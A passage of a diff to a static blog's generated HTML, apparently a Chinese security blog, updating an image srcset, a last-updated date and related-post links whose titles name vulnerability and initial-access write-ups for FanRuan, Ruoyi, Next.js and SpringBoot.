+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/14_hu8797d918c09dd9127f88a7953a27ae6c_288831_480x0_resize_box_3.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/14_hu8797d918c09dd9127f88a7953a27ae6c_288831_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="image-20251130214420240"
@@ -953,7 +1025,7 @@
 
 
         <span>
-            最后更新于 Dec 01, 2025 11:08 &#43;0800
+            最后更新于 Dec 30, 2025 15:26 &#43;0800
         </span>
     </section></footer>
 
@@ -972,19 +1044,27 @@
             
                 
 <article class="has-image">
-    <a href="/p/jadx-ai-mcp/">
+    <a href="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/">
         
         
             <div class="article-image">
-                <img src="/p/jadx-ai-mcp/logo.6bc1306b78ee1e383e13d69ca63d7566_hu_b392a00e4158a3ed.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post JADX AI MCP"
-                        
-                        data-hash="md5-a8Ewa3juHjg&#43;E9acpj11Zg==">
+                
+                    <img src="/logo.png" loading="lazy" data-key="" data-hash="/logo.png"/>
                 
             </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ruoyi快速打点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/jadx-ai-mcp/">
+        
         
 
         <div class="article-details">
@@ -1000,13 +1080,8 @@
         
         
             <div class="article-image">
-                <img src="/p/next.js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.d17b66a8326b901fbf01fc0ac9855f0d_hu_98c8ac508d6d21ae.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post Next.js常见漏洞"
-                        
-                        data-hash="md5-0XtmqDJrkB&#43;/AfwKyYVfDQ==">
+                
+                    <img src="/logo.png" loading="lazy" data-key="" data-hash="/logo.png"/>
                 
             </div>
         
@@ -1039,30 +1114,6 @@
 
         <div class="article-details">
             <h2 class="article-title">Burp AI Assistant</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/">
-        
-        
-            <div class="article-image">
-                <img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/logo.ec7efaecf7880bf687168c2a838241a2_hu_879f836f1a4679a6.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post SpringBoot框架打点"
-                        
-                        data-hash="md5-7H767PeIC/aHFowqg4JBog==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">SpringBoot框架打点</h2>
         </div>
     </a>
 </article>
